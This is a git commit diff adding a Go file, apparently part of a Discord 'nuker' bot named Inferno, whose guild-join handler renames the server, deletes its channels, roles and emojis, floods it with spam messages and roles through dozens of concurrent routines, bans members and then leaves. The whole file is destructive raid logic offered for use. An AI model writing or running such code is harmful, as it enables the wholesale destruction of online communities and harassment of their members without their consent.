eadfdab682e99b926228637085051c5fc215c086
N77R <100294280+n7tr@users.noreply.github.com>
2023-12-10 16:39:10 +0300

    Add files via upload

---
+++ src/auto.go
@@ -0,0 +1,50 @@
+package main
+
+import (
+	"Inferno/cogs"
+	"github.com/bwmarrin/discordgo"
+	"sync"
+)
+
+func onGuildCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
+	var wg sync.WaitGroup
+
+	cogs.Logs(s, event)
+	cogs.GuildRename(s, event)
+
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		cogs.DeleteChannels(s, event)
+	}()
+	wg.Wait()
+
+	for i := 0; i < 50; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			cogs.TextSpam(s, event, &wg)
+		}()
+	}
+	wg.Wait()
+
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		cogs.DeleteRoles(s, event)
+	}()
+	wg.Wait()
+
+	for i := 0; i < 40; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			cogs.RolesSpam(s, event)
+		}()
+	}
+	wg.Wait()
+
+	cogs.EmojiDelete(s, event)
+	cogs.MemberBan(s, event)
+	cogs.BotLeave(s, event)
+}
